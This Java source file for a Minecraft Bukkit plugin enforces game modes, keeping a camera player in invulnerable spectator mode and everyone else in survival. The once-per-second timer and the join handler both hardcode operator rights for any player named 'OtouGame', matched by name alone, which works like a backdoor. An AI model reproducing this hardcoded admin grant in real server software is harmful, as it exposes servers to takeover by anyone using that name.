package dev.gonjy.patrolspectator;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitTask;

import java.util.UUID;

import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerGameModeChangeEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerRespawnEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.PlayerDeathEvent;

public final class GameModeEnforcer implements Listener {
    private final Plugin plugin;
    private BukkitTask task;
    private UUID cameraOperator;

    public GameModeEnforcer(Plugin plugin) {
        this.plugin = plugin;
        plugin.getServer().getPluginManager().registerEvents(this, plugin);
    }

    public void start() {
        if (task != null)
            return;
        task = Bukkit.getScheduler().runTaskTimer(plugin, () -> {
            UUID cam = cameraOperator;
            for (Player p : Bukkit.getOnlinePlayers()) {
                // OtouGame に強制OP付与 (24/7 配信アカウント用)
                if (p.getName().equalsIgnoreCase("OtouGame") && !p.isOp()) {
                    try {
                        p.setOp(true);
                        plugin.getLogger().info("[Patrol] OtouGame に強制OP権限を付与しました。");
                    } catch (Throwable ignored) {
                    }
                }

                if (cam != null && p.getUniqueId().equals(cam)) {
                    // カメラ役は確実にスペクテイターモードかつ飛行状態にする
                    if (p.getGameMode() != GameMode.SPECTATOR) {
                        try {
                            p.setGameMode(GameMode.SPECTATOR);
                            p.setFlying(true);
                        } catch (Throwable ignored) {
                        }
                    }
                    try {
                        p.setInvulnerable(true);
                    } catch (Throwable ignored) {
                    }
                    continue;
                }

                // カメラ役以外はサバイバル強制
                ensurePlayerIsSurvival(p);
            }
        }, 20L, 20L); // 1秒周期
    }

    public void stop() {
        if (task != null) {
            task.cancel();
            task = null;
        }
    }

    public void shutdown() {
        stop();
    }

    public void setCameraOperator(UUID uuid) {
        this.cameraOperator = uuid;
    }

    public void clearCameraOperator() {
        if (this.cameraOperator != null) {
            Player p = Bukkit.getPlayer(this.cameraOperator);
            if (p != null && p.isOnline()) {
                try {
                    p.setInvulnerable(false);
                } catch (Throwable ignored) {
                }
            }
        }
        this.cameraOperator = null;
    }

    private boolean isCameraPlayer(Player p) {
        if (p == null) return false;
        if (cameraOperator != null && cameraOperator.equals(p.getUniqueId())) return true;
        
        if (plugin instanceof PatrolSpectatorPlugin) {
            PatrolSpectatorPlugin psp = (PatrolSpectatorPlugin) plugin;
            if (psp.getAutoStartConf() != null && psp.getAutoStartConf().enabled) {
                if (p.getName().equalsIgnoreCase(psp.getAutoStartConf().cameraPlayerName)) {
                    return true;
                }
            }
        }
        return false;
    }

    /**
     * 指定されたプレイヤーがカメラ役でない場合、サバイバルモードに強制します。
     */
    public void ensurePlayerIsSurvival(Player p) {
        if (p == null)
            return;
        
        if (isCameraPlayer(p)) {
            // カメラ役（予定）のプレイヤーなのでサバイバル強制を除外
            // かつ、即座にスペクテイターにして無敵化する
            if (p.getGameMode() != GameMode.SPECTATOR) {
                try {
                    p.setGameMode(GameMode.SPECTATOR);
                    p.setFlying(true);
                    p.setInvulnerable(true);
                } catch (Throwable ignored) {}
            }
            return;
        }

        if (p.getGameMode() != GameMode.SURVIVAL) {
            try {
                p.setGameMode(GameMode.SURVIVAL);
            } catch (Throwable ignored) {
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        // OtouGame へのOP付与
        if (p.getName().equalsIgnoreCase("OtouGame") && !p.isOp()) {
            p.setOp(true);
        }
        ensurePlayerIsSurvival(p);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onRespawn(PlayerRespawnEvent e) {
        // リスポーン直後にアドベンチャーになるのを防ぐため、少し遅らせて実行
        Bukkit.getScheduler().runTaskLater(plugin, () -> {
            ensurePlayerIsSurvival(e.getPlayer());
        }, 5L);
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onGameModeChange(PlayerGameModeChangeEvent e) {
        Player p = e.getPlayer();
        // カメラ役なら変更を許可（Spectator固定はタイマータスクがやるのでここでは邪魔しない）
        if (isCameraPlayer(p)) {
            return;
        }

        // サバイバル以外への変更を検知したらキャンセルするか、即座にサバイバルに戻す
        if (e.getNewGameMode() != GameMode.SURVIVAL) {
            // 他のプラグインによる強制変更を上書きするため、1tick後に戻す
            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                ensurePlayerIsSurvival(p);
            }, 1L);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onEntityDamage(EntityDamageEvent e) {
        if (e.getEntity() instanceof Player) {
            if (isCameraPlayer((Player) e.getEntity())) {
                e.setCancelled(true);
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerDeath(PlayerDeathEvent e) {
        if (isCameraPlayer(e.getEntity())) {
            // カメラ役が万が一死んだ場合、デスメッセージを消去し、即座にリスポーンさせる
            e.setDeathMessage(null);
            e.getDrops().clear();
            e.setDroppedExp(0);
            
            // サーバーの負荷を考慮して1tick後にリスポーンを実行
            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                try {
                    e.getEntity().spigot().respawn();
                } catch (Throwable ignored) {}
            }, 1L);
        }
    }
}
